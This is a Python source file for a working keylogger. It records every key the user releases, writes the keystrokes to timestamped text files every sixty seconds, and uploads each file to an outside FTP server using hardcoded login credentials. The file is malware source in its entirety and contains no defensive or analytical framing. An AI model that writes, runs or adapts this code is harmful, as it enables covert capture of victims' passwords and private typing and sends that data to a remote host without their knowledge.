import keyboard
import ftplib
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 60

FTP_HOST = "ftp.dlptest.com"
FTP_USER = "dlpuser"
FTP_PASS = "rNrKYTX9g7z3RgJRmxWuGHbeu"

class Keylogger:
    def __init__(self, interval, report_method="file"):
        self.interval = interval
        self.report_method = report_method
        # string variable which stores keystrokes
        self.log = ""
        # record start and end datetime
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occurred
        """

        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        else:
            name = event.name
        # add the key name to the log
        self.log += name

    def update_filename(self):
        # constructs the file name identified by date and time
        start_dt_str = str(self.start_dt)[:-7].replace("", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace("", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """
        This method creates a log file in the current directory that contains the current keylogs in the self.log variable
        """
        # open file in write mode
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylog to a text file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")


    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.report_method == "email":
                print("hello")
            elif self.report_method == "file":
                self.report_to_file()
                self.send_to_ftp()
            # print keylog in console(toggle)
            # print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def send_to_ftp(self):
        ftp = ftplib.FTP(FTP_HOST,FTP_USER,FTP_PASS)
        ftp.encoding = "utf-8"
        # send log file to ftp server
        with open(f"{self.filename}.txt", "rb") as file:
            ftp.storbinary(f"STOR {self.filename}.txt", file)
        print("File successfully transferred")
        ftp.quit()

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # make a simple message
        print(f"{datetime.now()} - Started keylogger")
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()